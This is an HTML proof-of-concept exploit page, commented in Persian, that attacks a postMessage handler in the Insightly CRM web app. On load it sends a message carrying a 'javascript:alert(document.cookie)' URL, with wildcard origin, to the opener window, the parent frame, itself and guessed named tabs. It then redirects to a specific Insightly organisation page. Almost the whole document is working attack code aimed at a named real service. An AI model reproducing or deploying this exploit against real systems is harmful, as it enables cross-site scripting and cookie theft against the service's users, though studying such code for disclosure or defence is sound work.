<!DOCTYPE html>
<html>
<body>
<script>
  // 🔴 این کد باید روی همان دامنه هدف اجرا شود یا بعد از ریدایرکت به هدف
  const PAYLOAD = { type: "mailchimp", url: "javascript:alert(document.cookie)" };

  // اجرای خودکار به محض لود
  window.addEventListener('load', () => {
    
    // ۱. اگر این صفحه توسط هدف باز شده (opener)
    if (window.opener && !window.opener.closed) {
      console.log('📤 Sending to opener...');
      window.opener.postMessage(PAYLOAD, "*");
    }
    
    // ۲. اگر داخل iframe هدف هستیم
    if (window.parent !== window) {
      console.log('📤 Sending to parent...');
      window.parent.postMessage(PAYLOAD, "*");
    }
    
    // ۳. ارسال به خودِ پنجره فعلی (اگر کد آسیب‌پذیر روی همین صفحه لود شده)
    console.log('📤 Sending to self...');
    window.postMessage(PAYLOAD, "*");
    
    // ۴. تلاش برای پیدا کردن تب‌های دیگر با نام‌های رایج
    const names = ['helper', 'popup', '_blank', 'insightly'];
    names.forEach(name => {
      try {
        const win = window.open('', name);
        if (win && win !== window) {
          console.log(`📤 Sending to ${name}...`);
          win.postMessage(PAYLOAD, "*");
        }
      } catch(e) {}
    });
  });

  // اگر هنوز روی دامنه مهاجم هستی، ریدایرکت به هدف
  setTimeout(() => {
    if (location.hostname !== 'crm.na1.insightly.com') {
      location.href = 'https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691';
    }
  }, 500);
</script>
<p>⏳ در حال اجرای خودکار... کنسول را چک کن.</p>
</body>
</html>
